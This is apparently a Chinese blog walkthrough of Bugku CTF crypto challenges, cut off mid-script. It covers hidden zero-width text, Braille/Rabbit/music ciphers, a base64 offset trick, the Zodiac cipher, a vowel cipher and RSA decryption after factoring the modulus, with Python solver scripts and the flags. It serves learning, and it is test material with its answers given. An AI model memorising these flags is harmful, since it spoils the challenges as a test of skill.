‌‌‌‌‌‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‍‍‍‌‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‌‍‍‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‌‌‍‍‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‍‍‍‍‍‍‍‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‌‍‍‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‌‌‍‍‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‌‌‌‌‌‌‌‌‌‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‍‍‍‌‍‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‍‍‍‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‍‍‍‌‍‌‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‌‌‍‍‍‌‌‌‌‌‌‍‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‍‍‍‍‍‍‍‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‌‌‍‌‌‌‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‌‌‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‌‌‍‌‌‌‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‌‌‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‍‍‍‍‍‍‍</p><p>《通知》要求，“十四五”期间，要重点支持中西部欠发达地区农村义务教育学校、幼儿园骨干教师、校园长和培训者深度培训；实现巩固拓展教育脱贫攻坚成果同乡村振兴有效衔接，支持国家乡村振兴重点帮扶县教师校长能力整体提升；辐射带动省、市、县、校级教师培训，实现教师培训全覆盖。 《通知》从培训内容体系、机制改革、能力建设、监管评价4个方面明确10项重点工作。在内容方面，强调要突出教师核心素养培养，将思想政治和师德师风作为必修内容。在机制改革方面，强调要实行分层分类精准培训，建立教师自主发展机制；创新教师发展协同机制，深入实施教师发展“一对一”精准帮扶；推动人工智能与教师培训融合，探索“智能+教师培训”，形成人工智能支持教师终身学习、持续发展的机制。在能力建设方面，强调要完善教师专业发展支持服务体系，加强市县教师发展机构专业化建设，建强专业化教师培训队伍，加强培训资源和平台建设，实现优质资源全面覆盖、全体共享。在监管评价方面，强调强化培训实施的监管评价，对教师学习过程和效果进行综合评价，适时提供反馈和跟踪指导。</p></blockquote><p>这个是一种<a href="http://www.atoolbox.net/Tool.php?Id=829">隐藏信息</a>使用隐藏信息解密得到<del>明文</del>(其实还是一重秘文)。<a href="https://ctf.bugku.com/tool/cvecode">社会主义核心价值观加密</a>这个加密方式在bugku靶场上面就有。解密得到flag。</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;why_d0nt_you_try_t0_understand_socia1ism?&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-这是个盲兔子-竟然在唱歌"><a href="#2-这是个盲兔子-竟然在唱歌" class="headerlink" title="2 这是个盲兔子,竟然在唱歌!"></a>2 这是个盲兔子,竟然在唱歌!</h3><p>这个题目名很有水平，在做完这个之后，我更是如此觉得。对应的这个题目的三层解码盲文，rabbit加密和解密，以及音乐符号密码。</p><blockquote><p>⡥⠂⡶⡃⡔⡷⡦⡛⡨⠁⠟⡚⠉⠇⡳⡜⡉⡤⡴⡑⡓⡆⡑⡔⡆⡠⡩⡹⠂⡢⡪⡵⡢⡟⡶⡹⠃⡒⠁⡥⡞⠟⡚⡞⡣⡣⡤⡀⡡⡆⠉⡼⡻⠀⠉⡧⡙⠇⡦⡇⡧⡅⡺⡑⠺⡑⡉⡑⠂⡞⡱⡳⠁⡊⡢⡩⡊⡚⡊⡕⡛⠀⡕⠂⡩⡱⡾⡴⠂⡶⡛⠈⡹⡇⡗⡑⠃⠁⡆⡝⡽⡺⡨⡙⠛⠅⠁⡠⡇⡩⡅⡸⡑⡧⡑⡸⠅⡆⡨⠛⡣⡨⡑⡢⡝⠁⡟⡚⡿⠺⠛⡿⡕⡴⡛⡡⠀⡔⠉⠂⡴⡃⠃⠀⡿⡹⠄⡺⡀⡵⡊⡝⡪⡨⡛⡦⡖⡛⡧⡡⡪⠈⡲⠟⡝⡔⡕⠅⡄⡞⠟⠂⡵⡉⠅⡩⡦⡼⡈⡴⡩⡈⠟⡞⡦⡩⡆⡛⡴⡾⡈⡁⡁⡗⠺⡹⡾⡆⡢⡹⡠⡈⡃⡛⠆⡁⡖⡻⡉⡡⡻⡓⠆⡁⡼⡷⠃⡛⠅⡵⠈⡝⡂⠉⡃⡄⡠⡠⡡⡒⡁⡃⡁⠅⡾⡨⠆⡘⠇⡄⡁⡲⠅⡖⠛⡓⡤⡃⡕⡺⡃⡝⡛⡳⠀⡢⡒⡙⠂⠺⡱⡉⡻⡒⡨⡄⡒⡒⡈⡱⡧⡽⠆⡉⡷⡹⠛⡊⠟⡥⡜⡳⡶⠆⡺⠉⠂⡂⡛⡥⡓⡝⡴⠆⡽⡟⠅⡿⡻⡸⡺⠆⡇⠂⠈⡼⡤⡕⠂⠈⡤⠅⠛⠁⡇⡟⡧⡈⡗⡲⡊⡸⠉⡻⠺⡱⡻⡥⠍=</p></blockquote><p>通过**<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen">盲文密码</a>**解码得到:</p><blockquote><p>U2FsdGVkX1/j97ClyTDacvadvPYI2RZERoFI3b1Un/jnSSTpQv9LK09Wi7VwWuJaaya2nAC1zRYzjzek0e2YAND2Fk8Iwga31vmMJXi+51PwYuHaWaH5vX+SXaRm1ojO+OeDkQ0d92Ds30OI4JpEzmZXkVfkWQZ8B/mde5tn/2Ey5YVLxDYx/nVYvkDNxqqgINvRIPxsk6qfKyQKc6qLG3k5E8mr9stPPQbqsq5NX6h7tqB5f+cTseJsmkC0Rbi2AyKbXtbbxAWM6yGI+z/UlCF6J92rkUcmD6Mo5OKHJ6w28LTe28T5+1woWxgBzH9KAKU=</p></blockquote><p>这一层是**<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">rabbit</a>**密码，在题干上有这一点。</p><blockquote><p>♬♯♩¶♬♫¶♭♩¶♫♪‖♯♬♭♩♬‖♫‖∮‖♩♬§‖♪¶‖♬♩♬§‖♩¶∮♬♬‖♪¶♭¶♯♫♯♩♫‖‖♬§‖♫♬♯♬§♫‖♩♩♫∮♬♩♫‖‖♪¶∮♫‖♫♫♯=</p></blockquote><p>在通过**<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">音乐解密</a><strong>得到</strong>flag**</p><pre class="line-numbers language-none"><code class="language-none">bugku&#123;2at746c5jfc6nh5klxs0c7bcvrzfv5nv&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-7-1-0"><a href="#3-7-1-0" class="headerlink" title="3 7+1=0"></a>3 7+1=0</h3><blockquote><p>4nXna/V7t2LpdLI44mn0fQ==</p></blockquote><p>这个是base64编码，但又有问题。使用在线工具编译得到的会是**ⵧk{b鴲8⩴}**需要使用base64-&gt;text方式解密，得到的结果依旧不都在可读范围内</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64miwen <span class="token operator">=</span> <span class="token string">'4nXna/V7t2LpdLI44mn0fQ=='</span>mingwen <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>miwen<span class="token punctuation">)</span><span class="token comment">#这一个题目生成的秘文应该类似于bugku&#123;&#125;,查看ascll码判断有多少出现在不可打印区域</span><span class="token keyword">print</span><span class="token punctuation">(</span>mingwen<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> mingwen<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>j <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">for</span> i <span class="token keyword">in</span> mingwen<span class="token punctuation">:</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>j <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    j <span class="token operator">+=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们通过base64-&gt;text方式看到?u?k?{?b?t?8?i?}，单数上面是不属于可输入范围，查看每一个ascll码的值，发现你们一堆200多的<del>ascll码</del>。这个flag大概是bugku{}，通过ascll码对照表发现相比正常的ascll码多了128，通过脚本解密得到flag。</p><p><img src="https://shierjinghuang.github.io/2021/10/16/bugku%E9%9D%B6%E5%9C%BA%E4%B9%8Bcrypto-%E4%BA%8C/1634378561332.png" alt="1634378561332"></p><pre class="line-numbers language-none"><code class="language-none">bugku&#123;7bit28bit&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-黄道12宫"><a href="#4-黄道12宫" class="headerlink" title="4 黄道12宫"></a>4 黄道12宫</h3><blockquote><p><strong>黄道十二宫杀手</strong>（Zodiac Killer）可能是世界上最知名的高智商连环杀手，52年来从未被抓获。这个连环变态杀手，在美国加州南部杀死了至少5人，声称自己手上有<strong>37条人命</strong>。作案的同时，他寄送了很多封以<strong>挑衅</strong>为主的信件给媒体，这些信件中包含着一些未公开的细节以及犯罪证据，甚至在其中署名。虽然一封408字符的文件已经被专家破解，但是其他信件继续困扰了警方和密码学专家<strong>51年</strong>。</p><p>1969年11月8日，在杀死了两名受害者之后，他向《旧金山纪事报》致信，并随信附上了340个加密字符。该密码被称为<strong>Z-340</strong>，或简称为340，一直未曾有人成功破解。</p></blockquote><p>关于这个加密的相关可以看这篇博客<a href="https://blog.csdn.net/QbitAI/article/details/111148126?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163437540116780366577743%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=163437540116780366577743&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-111148126.first_rank_v2_pc_rank_v29&utm_term=%E9%BB%84%E9%81%93%E5%8D%81%E4%BA%8C%E5%AE%AB%E5%AF%86%E7%A0%81&spm=1018.2226.3001.4187">黄道十二宫杀手密码51年后被破解，来自两位程序员与数学家通力合作</a></p><p><img src="https://shierjinghuang.github.io/2021/10/16/bugku%E9%9D%B6%E5%9C%BA%E4%B9%8Bcrypto-%E4%BA%8C/2.png" alt="2"></p><blockquote><p>II KILLED A LOT OF PEOPLE THERE ARE ENOUGH<br>SLAVES TO WORK FOR I I HOPE YOU CAN DECRYPT<br>IT AS SOON AS POSSIBLE.THIS IS FLAG ALPHAN<br>ANKE OTHERWISE I WILL CONTINUE TO KILLL</p></blockquote><p>得到<del>flag{alphananke}</del></p><hr><h3 id="5-你看得懂我的乐谱吗？"><a href="#5-你看得懂我的乐谱吗？" class="headerlink" title="5 你看得懂我的乐谱吗？"></a>5 你看得懂我的乐谱吗？</h3><p>抱歉我不懂音乐，我不懂这个乐谱。但是在bugku的评论区有人问到</p><blockquote><p>把音符还原成字母串后怎么不管大写还是小写放入flag{}都不对，去掉flag四个字也不对 。</p></blockquote><p>把音符还原成字符串,,,,这是个啥？之前那道题是音符加密，我以为这一道题也是与那一道相关。</p><p><img src="https://shierjinghuang.github.io/2021/10/16/bugku%E9%9D%B6%E5%9C%BA%E4%B9%8Bcrypto-%E4%BA%8C/%E4%B9%90%E8%B0%B1.png"></p><p><img src="https://shierjinghuang.github.io/2021/10/16/bugku%E9%9D%B6%E5%9C%BA%E4%B9%8Bcrypto-%E4%BA%8C/3.jpg"></p><p>看到这个之后，我还是不太明白，这里放一个大佬的推测。<img src="https://shierjinghuang.github.io/2021/10/16/bugku%E9%9D%B6%E5%9C%BA%E4%B9%8Bcrypto-%E4%BA%8C/4.png" alt="4"></p><p>这样可以得出flag，关于这个题目我想说，我不懂你的乐谱，我懂个de</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag<span class="token punctuation">&#123;</span>EMARKCISSOACHHLG<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="6-Math-amp-English"><a href="#6-Math-amp-English" class="headerlink" title="6 Math&amp;English"></a>6 Math&amp;English</h3><p><del>说实话，我会数学，但我真的不会英语。</del></p><p><img src="https://shierjinghuang.github.io/2021/10/16/bugku%E9%9D%B6%E5%9C%BA%E4%B9%8Bcrypto-%E4%BA%8C/5.png"></p><blockquote><p>计算结果： 21 33 1 22 3 44 54 5 1 35 54 3 35 41 52 13 </p></blockquote><p>结果全部都含义，1,2,3,4,5五个数字。他们告诉我这个是元音密码，这里是元音密码对照表。</p><p><img src="https://shierjinghuang.github.io/2021/10/16/bugku%E9%9D%B6%E5%9C%BA%E4%B9%8Bcrypto-%E4%BA%8C/6.png" alt="6"></p><p>对于得到<del>flagisyuanyinpwd</del>flagis记得删掉<strong>flag{yuanyinpwd}</strong></p><hr><h3 id="7-RSA"><a href="#7-RSA" class="headerlink" title="7  RSA"></a>7  RSA</h3><blockquote><p>N : 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597<br>e : 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</p><p>enc : 38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192</p></blockquote><p>使用在线的质数分解工具分解n，</p><pre class="line-numbers language-none"><code class="language-none">Q：28805791771260259486856902729020438686670354441296247148207862836064657849735343618207098163901787287368569768472521344635567334299356760080507454640207003<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">P:15991846970993213322072626901560749932686325766403404864023341810735319249066370916090640926219079368845510444031400322229147771682961132420481897362843199<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>搞了一个求解脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> libnum <span class="token keyword">import</span> n2s<span class="token punctuation">,</span>s2n<span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">egcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        g<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x <span class="token operator">=</span> egcd<span class="token punctuation">(</span>b <span class="token operator">%</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>g<span class="token punctuation">,</span> x <span class="token operator">-</span> <span class="token punctuation">(</span>b <span class="token operator">//</span> a<span class="token punctuation">)</span> <span class="token operator">*</span> y<span class="token punctuation">,</span> y<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">modinv</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">:</span>    g<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y <span class="token operator">=</span> egcd<span class="token punctuation">(</span>a<span class="token punctuation">,</span> m<span class="token punctuation">)</span>    <span class="token keyword">if</span> g <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'modular inverse does not exist'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> x <span class="token operator">%</span> mp<span class="token operator">=</span><span class="token number">15991846970993213322072626901560749932686325766403404864023341810735319249066370916090640926219079368845510444031400322229147771682961132420481897362843199</span>q<span class="token operator">=</span><span class="token number">28805791771260259486856902729020438686670354441296247148207862836064657849735343618207098163901787287368569768472521344635567334299356760080507454640207003</span>e <span class="token operator">=</span> <span class="token number">354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</span>d <span class="token operator">=</span> modinv<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token number">38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192</span>n <span class="token operator">=</span> p<span class="token operator">*</span>qm<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到<del><strong>flag{Wien3r_4tt@ck_1s_3AsY}</strong></del></p><h3 id="8-进制转换"><a href="#8-进制转换" class="headerlink" title="8 进制转换"></a>8 进制转换</h3><blockquote><p> 二进制、八进制、十进制、十六进制，你能分的清吗？ 来源：第七届大学生网络安全技能大赛 </p></blockquote><p> b 2进制 o 8进制 d 10进制 x 16进制，根据首字母确定进制并进行相应的转换，得到</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"> s<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"d87"</span><span class="token punctuation">,</span><span class="token string">"x65"</span><span class="token punctuation">,</span><span class="token string">"x6c"</span><span class="token punctuation">,</span><span class="token string">"x63"</span><span class="token punctuation">,</span><span class="token string">"o157"</span><span class="token punctuation">,</span><span class="token string">"d109"</span><span class="token punctuation">,</span><span class="token string">"o145"</span><span class="token punctuation">,</span><span class="token string">"b100000"</span><span class="token punctuation">,</span><span class="token string">"d116"</span><span class="token punctuation">,</span><span class="token string">"b1101111"</span><span class="token punctuation">,</span><span class="token string">"o40"</span><span class="token punctuation">,</span><span class="token string">"x6b"</span><span class="token punctuation">,</span><span class="token string">"b1100101"</span><span class="token punctuation">,</span><span class="token string">"b1101100"</span><span class="token punctuation">,</span><span class="token string">"o141"</span><span class="token punctuation">,</span><span class="token string">"d105"</span><span class="token punctuation">,</span><span class="token string">"x62"</span><span class="token punctuation">,</span><span class="token string">"d101"</span><span class="token punctuation">,</span><span class="token string">"b1101001"</span><span class="token punctuation">,</span><span class="token string">"d46"</span><span class="token punctuation">,</span><span class="token string">"o40"</span><span class="token punctuation">,</span><span class="token string">"d71"</span><span class="token punctuation">,</span><span class="token string">"x69"</span><span class="token punctuation">,</span><span class="token string">"d118"</span><span class="token punctuation">,</span><span class="token string">"x65"</span><span class="token punctuation">,</span><span class="token string">"x20"</span><span class="token punctuation">,</span><span class="token string">"b1111001"</span><span class="token punctuation">,</span><span class="token string">"o157"</span><span class="token punctuation">,</span><span class="token string">"b1110101"</span><span class="token punctuation">,</span><span class="token string">"d32"</span><span class="token punctuation">,</span><span class="token string">"o141"</span><span class="token punctuation">,</span><span class="token string">"d32"</span><span class="token punctuation">,</span><span class="token string">"d102"</span><span class="token punctuation">,</span><span class="token string">"o154"</span><span class="token punctuation">,</span><span class="token string">"x61"</span><span class="token punctuation">,</span><span class="token string">"x67"</span><span class="token punctuation">,</span><span class="token string">"b100000"</span><span class="token punctuation">,</span><span class="token string">"o141"</span><span class="token punctuation">,</span><span class="token string">"d115"</span><span class="token punctuation">,</span><span class="token string">"b100000"</span><span class="token punctuation">,</span><span class="token string">"b1100001"</span><span class="token punctuation">,</span><span class="token string">"d32"</span><span class="token punctuation">,</span><span class="token string">"x67"</span><span class="token punctuation">,</span><span class="token string">"o151"</span><span class="token punctuation">,</span><span class="token string">"x66"</span><span class="token punctuation">,</span><span class="token string">"d116"</span><span class="token punctuation">,</span><span class="token string">"b101110"</span><span class="token punctuation">,</span><span class="token string">"b100000"</span><span class="token punctuation">,</span><span class="token string">"d32"</span><span class="token punctuation">,</span><span class="token string">"d102"</span><span class="token punctuation">,</span><span class="token string">"d108"</span><span class="token punctuation">,</span><span class="token string">"d97"</span><span class="token punctuation">,</span><span class="token string">"o147"</span><span class="token punctuation">,</span><span class="token string">"d123"</span><span class="token punctuation">,</span><span class="token string">"x31"</span><span class="token punctuation">,</span><span class="token string">"b1100101"</span><span class="token punctuation">,</span><span class="token string">"b110100"</span><span class="token punctuation">,</span><span class="token string">"d98"</span><span class="token punctuation">,</span><span class="token string">"d102"</span><span class="token punctuation">,</span><span class="token string">"b111000"</span><span class="token punctuation">,</span><span class="token string">"d49"</span><span class="token punctuation">,</span><span class="token string">"b1100001"</span><span class="token punctuation">,</span><span class="token string">"d54"</span><span class="token punctuation">,</span><span class="token string">"b110011"</span><span class="token punctuation">,</span><span class="token string">"x39"</span><span class="token punctuation">,</span><span class="token string">"o64"</span><span class="token punctuation">,</span><span class="token string">"o144"</span><span class="token punctuation">,</span><span class="token string">"o145"</span><span class="token punctuation">,</span><span class="token string">"d53"</span><span class="token punctuation">,</span><span class="token string">"x61"</span><span class="token punctuation">,</span><span class="token string">"b1100010"</span><span class="token punctuation">,</span><span class="token string">"b1100011"</span><span class="token punctuation">,</span><span class="token string">"o60"</span><span class="token punctuation">,</span><span class="token string">"d48"</span><span class="token punctuation">,</span><span class="token string">"o65"</span><span class="token punctuation">,</span><span class="token string">"b1100001"</span><span class="token punctuation">,</span><span class="token string">"x63"</span><span class="token punctuation">,</span><span class="token string">"b110110"</span><span class="token punctuation">,</span><span class="token string">"d101"</span><span class="token punctuation">,</span><span class="token string">"o63"</span><span class="token punctuation">,</span><span class="token string">"b111001"</span><span class="token punctuation">,</span><span class="token string">"d97"</span><span class="token punctuation">,</span><span class="token string">"d51"</span><span class="token punctuation">,</span><span class="token string">"o70"</span><span class="token punctuation">,</span><span class="token string">"d55"</span><span class="token punctuation">,</span><span class="token string">"b1100010"</span><span class="token punctuation">,</span><span class="token string">"d125"</span><span class="token punctuation">,</span><span class="token string">"x20"</span><span class="token punctuation">,</span><span class="token string">"b101110"</span><span class="token punctuation">,</span><span class="token string">"x20"</span><span class="token punctuation">,</span><span class="token string">"b1001000"</span><span class="token punctuation">,</span><span class="token string">"d97"</span><span class="token punctuation">,</span><span class="token string">"d118"</span><span class="token punctuation">,</span><span class="token string">"o145"</span><span class="token punctuation">,</span><span class="token string">"x20"</span><span class="token punctuation">,</span><span class="token string">"d97"</span><span class="token punctuation">,</span><span class="token string">"o40"</span><span class="token punctuation">,</span><span class="token string">"d103"</span><span class="token punctuation">,</span><span class="token string">"d111"</span><span class="token punctuation">,</span><span class="token string">"d111"</span><span class="token punctuation">,</span><span class="token string">"x64"</span><span class="token punctuation">,</span><span class="token string">"d32"</span><span class="token punctuation">,</span><span class="token string">"o164"</span><span class="token punctuation">,</span><span class="token string">"b1101001"</span><span class="token punctuation">,</span><span class="token string">"x6d"</span><span class="token punctuation">,</span><span class="token string">"o145"</span><span class="token punctuation">,</span><span class="token string">"x7e"</span><span class="token punctuation">]</span>s1<span class="token operator">=</span><span class="token string">""</span>t<span class="token operator">=</span><span class="token string">""</span>t1<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    s1<span class="token operator">=</span>i    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> s1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'d'</span><span class="token punctuation">:</span>            t<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>s1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            t<span class="token operator">=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">" "</span>            t1<span class="token operator">=</span>t1<span class="token operator">+</span>t        <span class="token keyword">if</span> s1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'x'</span><span class="token punctuation">:</span>            t<span class="token operator">=</span>s1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">" "</span>            t1<span class="token operator">=</span>t1<span class="token operator">+</span>t        <span class="token keyword">if</span> s1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'o'</span><span class="token punctuation">:</span>            t<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>s1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            t<span class="token operator">=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">" "</span>            t1<span class="token operator">=</span>t1<span class="token operator">+</span>t                    <span class="token keyword">if</span> s1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'b'</span><span class="token punctuation">:</span>            t<span class="token operator">=</span><span class="token builtin">str</span><span 